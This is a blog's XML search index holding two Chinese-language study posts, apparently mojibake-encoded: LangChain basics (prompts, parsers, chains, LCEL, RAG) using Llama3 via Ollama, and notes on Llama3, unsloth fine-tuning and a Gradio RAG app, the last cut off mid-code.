<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>langchainç®€å•å­¦ä¹ </title>
      <link href="/2024/04/26/langchain%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/04/26/langchain%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>ä¸­æ–‡æ–‡æ¡£: <a href="https://python.langchain.com.cn/docs/modules/memory/types/">LangChain</a></p><p>å®˜æ–¹éƒ½æ˜¯ç”¨çš„openaiçš„æ¨¡å‹,ä½†æ˜¯å…è´¹èµ„æºæˆ‘å·²ç»ç”¨å®Œäº†,è¿™é‡Œå°±ç”¨å…è´¹çš„llama.</p><h2 id="import">import</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> langchain_community.llms <span class="keyword">import</span> Ollama</span><br><span class="line"><span class="keyword">from</span> langchain_community.chat_models.ollama <span class="keyword">import</span> ChatOllama</span><br><span class="line"><span class="comment"># llm</span></span><br><span class="line">llm = Ollama(model=<span class="string">&quot;llama3&quot;</span>, keep_alive=-<span class="number">1</span>)</span><br><span class="line"><span class="comment"># chat model</span></span><br><span class="line">chatmodel = ChatOllama(model=<span class="string">&#x27;llama3&#x27;</span>, keep_alive=-<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><code>keep_alive=-1</code>å¯ä»¥ä¿è¯æ¨¡å‹æ€»æ˜¯åœ¨å†…å­˜è½½å…¥, æ–¹ä¾¿å­¦ä¹ ä½¿ç”¨, ç¯å¢ƒæ–¹é¢ç”¨çš„ä¹Ÿæ˜¯notebook, å—æ‰§è¡Œæ–¹ä¾¿ä¸å°‘.</p><h2 id="prompt">prompt</h2><p>promptå°†è¾“å…¥ä»dictionaryè¯»å…¥template,æœ¬è´¨format</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> langchain.prompts <span class="keyword">import</span> PromptTemplate</span><br><span class="line"></span><br><span class="line">prompt = PromptTemplate.from_template(<span class="string">&quot;What is a good name for a company that makes &#123;product&#125;?&quot;</span>)</span><br><span class="line">prompt.<span class="built_in">format</span>(product=<span class="string">&quot;colorful socks&quot;</span>)</span><br><span class="line"><span class="comment"># &#x27;What is a good name for a company that makes colorful socks?&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="message-type">Message type</h2><p>é¦–å…ˆå‡ ç§ç±»å‹</p><p><img src="message_type.png" /></p><ul><li>HumanMessage: æ¥è‡ªäººç±»/ç”¨æˆ·çš„ChatMessageã€‚</li><li>AIMessage: æ¥è‡ªAI/åŠ©æ‰‹çš„ChatMessageã€‚</li><li>SystemMessage: æ¥è‡ªç³»ç»Ÿçš„ChatMessageã€‚</li><li>FunctionMessage: æ¥è‡ªå‡½æ•°è°ƒç”¨çš„ChatMessageã€‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> langchain.prompts.chat <span class="keyword">import</span> (</span><br><span class="line">    ChatPromptTemplate,</span><br><span class="line">    SystemMessagePromptTemplate,</span><br><span class="line">    HumanMessagePromptTemplate,</span><br><span class="line">)</span><br><span class="line"><span class="comment"># ç³»ç»Ÿå…¨å±€è®¾å®š</span></span><br><span class="line">template = <span class="string">&quot;You are a helpful assistant that translates &#123;input_language&#125; to &#123;output_language&#125;.&quot;</span></span><br><span class="line">system_message_prompt = SystemMessagePromptTemplate.from_template(template)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”¨æˆ·è¾“å…¥</span></span><br><span class="line">human_template = <span class="string">&quot;&#123;text&#125;&quot;</span></span><br><span class="line">human_message_prompt = HumanMessagePromptTemplate.from_template(human_template)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chatæ„å»º</span></span><br><span class="line">chat_prompt = ChatPromptTemplate.from_messages([system_message_prompt, human_message_prompt])</span><br><span class="line"></span><br><span class="line">chat_prompt.format_messages(input_language=<span class="string">&quot;English&quot;</span>, output_language=<span class="string">&quot;Chinese&quot;</span>, text=<span class="string">&quot;I love programming.&quot;</span>)</span><br><span class="line"><span class="comment"># [SystemMessage(content=&#x27;You are a helpful assistant that translates English to Chinese.&#x27;), HumanMessage(content=&#x27;I love programming.&#x27;)]</span></span><br></pre></td></tr></table></figure><h2 id="parser">parser</h2><p>è´Ÿè´£è¾“å‡ºè§£æ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> langchain.schema <span class="keyword">import</span> BaseOutputParser</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CommaSeparatedListOutputParser</span>(<span class="title class_ inherited__">BaseOutputParser</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Parse the output of an LLM call to a comma-separated list.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, text: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Parse the output of an LLM call.&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> text.strip().split(<span class="string">&quot;, &quot;</span>)</span><br><span class="line"></span><br><span class="line">CommaSeparatedListOutputParser().parse(<span class="string">&quot;hi, bye&quot;</span>)</span><br><span class="line"><span class="comment"># [&#x27;hi&#x27;, &#x27;bye&#x27;]</span></span><br></pre></td></tr></table></figure><p>æ–‡æ¡£å‰é¢ä»‹ç»çš„parseréƒ½éå¸¸ç®€å•, å‡ ä¹éƒ½æ˜¯basemodel, ä½†å…¶å®parseræä¾›çš„åŠŸèƒ½æ˜¯ä¸€æ–¹é¢æ˜¯è¾“å‡ºè§£æ, å¦ä¸€æ–¹é¢ä¹Ÿå¯ä»¥çœ‹ä½œä¸‹ä¸€ä¸ªpiplineè¾“å…¥çš„preprocessing.</p><h2 id="chain">Chain</h2><p>æ¨¡å—è¿æ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> langchain.chains <span class="keyword">import</span> LLMChain</span><br><span class="line"><span class="comment"># ç³»ç»Ÿå…¨å±€è®¾å®š</span></span><br><span class="line"><span class="comment"># template = &quot;You no nothing about &#123;subject&#125; and have no common sense.&quot;</span></span><br><span class="line">template = <span class="string">&quot;You are an expert in &#123;subject&#125;.&quot;</span></span><br><span class="line">system_message_prompt = SystemMessagePromptTemplate.from_template(template)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”¨æˆ·è¾“å…¥</span></span><br><span class="line">human_template = <span class="string">&quot;&#123;text&#125;&quot;</span></span><br><span class="line">human_message_prompt = HumanMessagePromptTemplate.from_template(human_template)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chatæ„å»º</span></span><br><span class="line">chat_prompt = ChatPromptTemplate.from_messages([system_message_prompt, human_message_prompt])</span><br><span class="line">chain = LLMChain(</span><br><span class="line">    llm = llm,</span><br><span class="line">    prompt=chat_prompt,</span><br><span class="line">    output_parser=CommaSeparatedListOutputParser()</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">chain.invoke(&#123;<span class="string">&#x27;subject&#x27;</span>:<span class="string">&#x27;math&#x27;</span>, <span class="string">&#x27;text&#x27;</span>:<span class="string">&#x27;try to predict the next 5 numbers: 1, 1, 2, 3, 5&#x27;</span>&#125;)</span><br><span class="line"><span class="comment"># &#123;&#x27;subject&#x27;: &#x27;math&#x27;,</span></span><br><span class="line"><span class="comment">#  &#x27;text&#x27;: [&#x27;A classic sequence!\n\nThis appears to be the Fibonacci sequence&#x27;,</span></span><br><span class="line"><span class="comment">#   &#x27;where each number is the sum of the two preceding ones:\n\n1&#x27;,</span></span><br><span class="line"><span class="comment">#   &#x27;1&#x27;,</span></span><br><span class="line"><span class="comment">#   &#x27;2&#x27;,</span></span><br><span class="line"><span class="comment">#   &#x27;3&#x27;,</span></span><br><span class="line"><span class="comment">#   &#x27;5&#x27;,</span></span><br><span class="line"><span class="comment">#   &quot;...\n\nIf that&#x27;s correct&quot;,</span></span><br><span class="line"><span class="comment">#   &#x27;the next five numbers would be:\n\n8&#x27;,</span></span><br><span class="line"><span class="comment">#   &#x27;13&#x27;,</span></span><br><span class="line"><span class="comment">#   &#x27;21&#x27;,</span></span><br><span class="line"><span class="comment">#   &#x27;34&#x27;,</span></span><br><span class="line"><span class="comment">#   &#x27;55\n\nAm I right?&#x27;]&#125;</span></span><br></pre></td></tr></table></figure><h2 id="lcel">LCEL</h2><p>Langchainè¡¨è¾¾å¼, å®˜æ–¹æè¿°çš„ä¼˜åŠ¿</p><ul><li>æµå¼æ”¯æŒ</li><li>å¼‚æ­¥</li><li>å¹¶è¡Œå¤„ç†</li><li>é‡è¯•å›é€€</li><li>ä¸­é—´ç»“æœè®¿é—®</li><li>è¾“å…¥è¾“å‡ºæ¨¡å¼</li><li>LangSmithè·Ÿè¸ªä»¥æä¾›å¯è°ƒè¯•æ€§</li><li>æ— ç¼LangServeé›†æˆ</li></ul><p>ç›®å‰æˆ‘åªè¯»åˆ°äº†å¹¶è¡Œ.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> langchain_core.output_parsers <span class="keyword">import</span> StrOutputParser</span><br><span class="line">prompt = ChatPromptTemplate.from_template(<span class="string">&#x27;tell me a short joke about &#123;topic&#125;&#x27;</span>)</span><br><span class="line">output_parser = StrOutputParser()</span><br><span class="line">chain = prompt | llm | output_parser</span><br><span class="line">chain.invoke(&#123;<span class="string">&#x27;topic&#x27;</span>:<span class="string">&#x27;large language model&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ç®¡é“ç¬¦è´Ÿè´£çš„æ˜¯è¿æ¥ç»„ä»¶</p><p>é‚£ä¹ˆæ¨¡å‹å‘ç”Ÿäº†ä»€ä¹ˆå‘¢?</p><ol type="1"><li>é¦–å…ˆPromptæ¥å—è¾“å…¥ç”ŸæˆPromptValue</li><li>chatModelæ¥æ”¶åˆ°PromptValueä¹‹åç”ŸæˆChatMessage(å¦‚æœæ˜¯LLMçš„è¯è¾“å‡ºä¸ºstr)</li><li>æœ€åChatMessageä¸¢å…¥parserè´Ÿè´£æœ€ç»ˆè§£æ,æœ€åè¾“å‡º</li></ol><h3 id="ragå®ä¾‹">RAGå®ä¾‹</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> langchain_community.vectorstores <span class="keyword">import</span> DocArrayInMemorySearch</span><br><span class="line"><span class="keyword">from</span> langchain_core.output_parsers <span class="keyword">import</span> StrOutputParser</span><br><span class="line"><span class="keyword">from</span> langchain_core.prompts <span class="keyword">import</span> ChatPromptTemplate</span><br><span class="line"><span class="keyword">from</span> langchain_core.runnables <span class="keyword">import</span> RunnableParallel, RunnablePassthrough</span><br><span class="line"><span class="keyword">from</span> langchain_community.chat_models.ollama <span class="keyword">import</span> ChatOllama</span><br><span class="line"><span class="keyword">from</span> langchain_community.embeddings.ollama <span class="keyword">import</span> OllamaEmbeddings</span><br><span class="line"></span><br><span class="line">vectorstore = DocArrayInMemorySearch.from_texts(</span><br><span class="line">    [<span class="string">&#x27;harrison worked at kensho&#x27;</span>, <span class="string">&#x27;bears like to eat honey&#x27;</span>],</span><br><span class="line">    embedding=OllamaEmbeddings(),</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">retriever = vectorstore.as_retriever()</span><br><span class="line">template = <span class="string">&#x27;&#x27;&#x27;Answer the question based only on the following context:</span></span><br><span class="line"><span class="string">&#123;context&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Question: &#123;question&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">prompt = ChatPromptTemplate.from_template(template)</span><br><span class="line"><span class="comment"># chatmodel = ChatOllama(model=&#x27;llama3&#x27;, keep_alive=-1)</span></span><br><span class="line"></span><br><span class="line">output_parser = StrOutputParser()</span><br><span class="line">setup_and_retrieval = RunnableParallel(</span><br><span class="line">    &#123;<span class="string">&#x27;context&#x27;</span>: retriever, <span class="string">&#x27;question&#x27;</span>: RunnablePassthrough()&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">chain = setup_and_retrieval | prompt | chatmodel | output_parser</span><br><span class="line">chain.invoke(<span class="string">&#x27;what did bear eat?&#x27;</span>)</span><br><span class="line"><span class="comment"># &#x27;According to the provided context, bears like to eat honey.&#x27;</span></span><br></pre></td></tr></table></figure><p>ä¸Šè¿°æ¨¡ç‰ˆæ¥å—contextå’Œquestion.</p><ol type="1"><li>é¦–å…ˆåˆ›é€ RunnableParallelä»æ–‡æ¡£æ£€ç´¢context, ç„¶åRunnablePassthroughè¾“å…¥ä¼ å…¥åˆ°question</li><li>ä¸Šè¿°æ­¥éª¤æ„æˆçš„å­—å…¸ä¼ å…¥promptæ„æˆpromptValue</li><li>chatmodelæ¥æ”¶åˆ°promptValueç”ŸæˆchatMessage</li><li>parseræ¥å—Messageåšè§£æç„¶åè¾“å‡º</li></ol><h3 id="interface">Interface</h3><h4 id="schema">schema</h4><p>schemaç”¨äºæŸ¥çœ‹è¾“å…¥è¾“å‡ºæ¨¡å¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">prompt = ChatPromptTemplate.from_template(<span class="string">&quot;tell me a joke about &#123;topic&#125;&quot;</span>)</span><br><span class="line">chain = prompt | chatmodel</span><br><span class="line">chain.input_schema.schema(), chain.output_schema.schema()</span><br></pre></td></tr></table></figure><h4 id="stream">stream</h4><p>æµå¼è¾“å‡º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> chain.stream(&#123;<span class="string">&quot;topic&quot;</span>: <span class="string">&quot;bears&quot;</span>&#125;):</span><br><span class="line">    <span class="built_in">print</span>(s.content, end=<span class="string">&quot;&quot;</span>, flush=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h4 id="invoke-batch">invoke &amp; batch</h4><p>invokeè¾“å…¥æ‰§è¡Œ, batchè¾“å…¥åˆ—è¡¨æ‰§è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chain.invoke(&#123;<span class="string">&quot;topic&quot;</span>: <span class="string">&quot;bears&quot;</span>&#125;)</span><br><span class="line"><span class="comment"># AIMessage(content=&#x27;Why did the bear go to the doctor?\n\nBecause it had a grizzly cough!\n\nHope that made you roar with laughter!&#x27;, response_metadata=&#123;&#x27;model&#x27;: &#x27;llama3&#x27;, &#x27;created_at&#x27;: &#x27;2024-04-26T18:59:12.682597827Z&#x27;, &#x27;message&#x27;: &#123;&#x27;role&#x27;: &#x27;assistant&#x27;, &#x27;content&#x27;: &#x27;&#x27;&#125;, &#x27;done&#x27;: True, &#x27;total_duration&#x27;: 2376927414, &#x27;load_duration&#x27;: 780076, &#x27;prompt_eval_duration&#x27;: 104313000, &#x27;eval_count&#x27;: 26, &#x27;eval_duration&#x27;: 2269974000&#125;, id=&#x27;run-1da506c7-4321-43b3-9a20-73e378bb5d53-0&#x27;)</span></span><br><span class="line">chain.batch([&#123;<span class="string">&quot;topic&quot;</span>: <span class="string">&quot;bears&quot;</span>&#125;, &#123;<span class="string">&quot;topic&quot;</span>: <span class="string">&quot;cats&quot;</span>&#125;])</span><br><span class="line"><span class="comment"># [AIMessage(content=&quot;Here&#x27;s one:\n\nWhy did the bear go to the doctor?\n\nBecause it had a grizzly cough!\n\nHope that made you roar with laughter!&quot;, response_metadata=&#123;&#x27;model&#x27;: &#x27;llama3&#x27;, &#x27;created_at&#x27;: &#x27;2024-04-26T18:59:27.384268553Z&#x27;, &#x27;message&#x27;: &#123;&#x27;role&#x27;: &#x27;assistant&#x27;, &#x27;content&#x27;: &#x27;&#x27;&#125;, &#x27;done&#x27;: True, &#x27;total_duration&#x27;: 3058382240, &#x27;load_duration&#x27;: 446359, &#x27;prompt_eval_count&#x27;: 6, &#x27;prompt_eval_duration&#x27;: 415392000, &#x27;eval_count&#x27;: 30, &#x27;eval_duration&#x27;: 2641467000&#125;, id=&#x27;run-8fcefbc7-d3eb-424f-8328-ff1c4c9461c0-0&#x27;),</span></span><br><span class="line"><span class="comment"># AIMessage(content=&#x27;Why did the cat join a band?\n\nBecause it wanted to be the purr-cussionist!\n\nMeow-velous, right?&#x27;, response_metadata=&#123;&#x27;model&#x27;: &#x27;llama3&#x27;, &#x27;created_at&#x27;: &#x27;2024-04-26T18:59:24.325741194Z&#x27;, &#x27;message&#x27;: &#123;&#x27;role&#x27;: &#x27;assistant&#x27;, &#x27;content&#x27;: &#x27;&#x27;&#125;, &#x27;done&#x27;: True, &#x27;total_duration&#x27;: 2914778748, &#x27;load_duration&#x27;: 1199486, &#x27;prompt_eval_count&#x27;: 6, &#x27;prompt_eval_duration&#x27;: 425677000, &#x27;eval_count&#x27;: 29, &#x27;eval_duration&#x27;: 2484935000&#125;, id=&#x27;run-cd7e0e28-818e-4b4b-a5d6-60f71b815bf9-0&#x27;)]</span></span><br></pre></td></tr></table></figure><h4 id="å¼‚æ­¥">å¼‚æ­¥</h4><p>ä¸Šè¿°æ–¹æ³•éƒ½æ”¯æŒå¼‚æ­¥:</p><ul><li>astream: å¼‚æ­¥æµå¼è¿”å›å“åº”çš„å—</li><li>ainvoke: å¼‚æ­¥åœ¨è¾“å…¥ä¸Šè°ƒç”¨é“¾</li><li>abatch: å¼‚æ­¥åœ¨è¾“å…¥åˆ—è¡¨ä¸Šè°ƒç”¨é“¾</li><li>astream_log: å¼‚æ­¥æµå¼è¿”å›ä¸­é—´æ­¥éª¤ï¼Œä»¥åŠæœ€ç»ˆå“åº”</li><li>astream_events: beta å¼‚æ­¥æµå¼è¿”å›é“¾ä¸­å‘ç”Ÿçš„äº‹ä»¶ï¼ˆåœ¨ langchain-core 0.1.14 ä¸­å¼•å…¥ï¼‰</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">for</span> s <span class="keyword">in</span> chain.astream(&#123;<span class="string">&quot;topic&quot;</span>: <span class="string">&quot;bears&quot;</span>&#125;):</span><br><span class="line">    <span class="built_in">print</span>(s.content, end=<span class="string">&quot;&quot;</span>, flush=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h2 id="é¢˜å¤–è¯">é¢˜å¤–è¯</h2><p>çœ‹åˆ°è¿™é‡Œå¤§æ¦‚å·²ç»æ˜ç™½langchainæ˜¯å¹²å•¥çš„äº†, æƒ³äº†ä¸€ä¸‹æ„Ÿè§‰è¿™ç§ç”¨æˆ·å¯ä»¥éšæ„è¾“å…¥æ¡†æ¶è‚¯å®šä¹Ÿä¼šæœ‰å®‰å…¨é—®é¢˜, æ¯”å¦‚å¦‚ä½•ä¿è¯è¾“å…¥æ˜¯å®‰å…¨çš„å‘¢. ç„¶åå°±çœ‹åˆ°æœ‰æ–‡ç« å·²ç»è®²è¿‡äº†: <a href="https://www.secrss.com/articles/59635">æ·±å…¥å‰–æå¤§æ¨¡å‹å®‰å…¨é—®é¢˜ï¼šLangchainæ¡†æ¶çš„éšè—é£é™©</a>.</p><p>CVE-2023-29374: LLMMathChainä»»æ„ä»£ç æ‰§è¡Œæ¼æ´. æ‰€ä»¥è¯´å¼€å‘ä¸­è¿˜æ˜¯è¦ä¿ç•™ä¸€äº›å®‰å…¨æ„è¯†, å°¤å…¶æ˜¯æœ‰ç”¨æˆ·å¯æ§è¡Œä¸ºçš„æ—¶å€™.</p><p>è¿™é‡Œåªæ˜¯langchainçš„æœ€åŸºç¡€çš„éƒ¨åˆ†ä½†ä¹Ÿæ˜¯æœ€æ ¸å¿ƒçš„éƒ¨åˆ†, åç»­è¿˜ä¼šç»§ç»­çœ‹Langchainçš„å‰©ä¸‹ä¸€éƒ¨åˆ†æ–‡æ¡£.</p>]]></content>
      
      
      <categories>
          
          <category> ML NLP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Llamaå­¦ä¹ ä»¥åŠå¯¹å¤§æ¨¡å‹çš„ä¸€äº›æ€è€ƒ</title>
      <link href="/2024/04/25/Llama%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%AF%B9%E5%A4%A7%E6%A8%A1%E5%9E%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"/>
      <url>/2024/04/25/Llama%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%AF%B9%E5%A4%A7%E6%A8%A1%E5%9E%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘llama3é—®ä¸–äº†, ä¹‹å‰äº†è§£äº†ä¸€ä¸‹llamaç›¸å…³, å¤§æ¦‚å°±æ˜¯ä¸€ä¸ªå¼€æºå¯å•†ç”¨gpt. <a href="https://huggingface.co/meta-llama/Meta-Llama-3-8B">huggingfaceæ¨¡å‹</a>. ç„¶åè‡ªå·±ä¹Ÿä¸‹è½½ä¸‹æ¥å°è¯•äº†ä¸€ä¸‹, ç”¨ollamaå°±å¯ä»¥ç›´æ¥åœ¨è‡ªå·±æœ¬æœºè·‘,ä¸éœ€è¦å»å­¦æ ¡æœºå™¨äº†.</p><p><img src="chat_llama.png" /></p><h1 id="unsloth">unsloth</h1><p>unslothæä¾›æ›´ä½å†…å­˜å ç”¨,æ›´å¿«è®­ç»ƒçš„finetuning. å®˜æ–¹ä¹Ÿç»™å‡ºäº†<a href="https://colab.research.google.com/drive/135ced7oHytdxu3N2DNe1Z0kqjyYIkDXp?usp=sharing">Llama-3 8bçš„notebook</a>,å¯ä»¥è‡ªå·±è°ƒæ•´.</p><p>ç®€å•çš„å¯¹æ¯”,æ²¡æœ‰åšloraä¹‹å‰</p><p><img src="untrained_ruozhiba.png" /></p><p>åšäº†ç®€å•çš„finetuningä¹‹å</p><p><img src="trained_ruozhiba.png" /></p><h1 id="rag">RAG</h1><p><a href="https://www.youtube.com/watch?v=T-D1OfcDW1M">What is Retrieval-Augmented Generation (RAG)?</a></p><p>è‡³äºå®ç°,youtubeä¸Šä¹Ÿæœ‰ç›¸åº”æ•™å­¦<a href="https://www.youtube.com/watch?v=O7RdEyRsatw">Llama 3 RAG: How to Create AI App using Ollama?</a>. è®²çš„éå¸¸å¥½, è®°å½•ä¸€ä¸‹.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gradio <span class="keyword">as</span> gr</span><br><span class="line"><span class="keyword">import</span> bs4</span><br><span class="line"><span class="keyword">from</span> langchain.text_splitter <span class="keyword">import</span> RecursiveCharacterTextSplitter</span><br><span class="line"><span class="keyword">from</span> langchain_community.document_loaders <span class="keyword">import</span> WebBaseLoader</span><br><span class="line"><span class="keyword">from</span> langchain_community.vectorstores <span class="keyword">import</span> Chroma</span><br><span class="line"><span class="keyword">from</span> langchain_community.embeddings <span class="keyword">import</span> OllamaEmbeddings</span><br><span class="line"><span class="keyword">import</span> ollama</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to load, split, and retrieve documents</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_and_retrieve_docs</span>(<span class="params">url</span>):</span><br><span class="line">    loader = WebBaseLoader(</span><br><span class="line">        web_paths=(url,),</span><br><span class="line">        bs_kwargs=<span class="built_in">dict</span>() </span><br><span class="line">    )</span><br><span class="line">    docs = loader.load()</span><br><span class="line">    text_splitter = RecursiveCharacterTextSplitter(chunk_size=<span class="number">1000</span>, chunk_overlap=<span class="number">200</span>)</span><br><span class="line">    splits = text_splitter.split_documents(docs)</span><br><span class="line">    embeddings = OllamaEmbeddings(model=<span class="string">&quot;nomic-embed-text&quot;</span>)</span><br><span class="line">    vectorstore = Chroma.from_documents(documents=splits, embedding=embeddings)</span><br><span class="line">    <span class="keyword">return</span> vectorstore.as_retriever()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to format documents</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">format_docs</span>(<span class="params">docs</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;\n\n&quot;</span>.join(doc.page_content <span class="keyword">for</span> doc <span class="keyword">in</span> docs)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function that defines the RAG chain</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rag_chain</span>(<span class="params">url, question</span>):</span><br><span class="line">    retriever = load_and_retrieve_docs(url)</span><br><span class="line">    retrieved_docs = retriever.invoke(question)</span><br><span class="line">    formatted_context = format_docs(retrieved_docs)</span><br><span class="line">    formatted_prompt = <span class="string">f&quot;Question: <span class="subst">&#123;question&#125;</span>\n\nContext: <span class="subst">&#123;formatted_context&#125;</span>&quot;</span></span><br><span class="line">    response = ollama.chat(model=<span class="string">&#x27;llama3&#x27;</span>, messages=[&#123;<span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;content&#x27;</span>: formatted_prompt&#125;])</span><br><span class="line">    <span class="keyword">return</span> response[<span class="string">&#x27;message&#x27;</span>][<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Gradio interface</span></span><br><span class="line">iface = gr.Interface(</span><br><span class="line">    fn=rag_chain,</span><br><span class="line">    inputs=[<span class="string">&quot;text&quot;</span>, <span class="string">&quot;text&quot;</span>],</span><br><span class="line">    outputs=<span class="string">&quot;text&quot;</span>,</span><br><span class="line">    title=<span class="string">&quot;RAG Chain Question Answering&quot;</span>,</span><br><span class="line">    description=<span class="string">&quot;Enter a URL and a query to get answers from the RAG chain.&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Launch the app</span></span><br><span 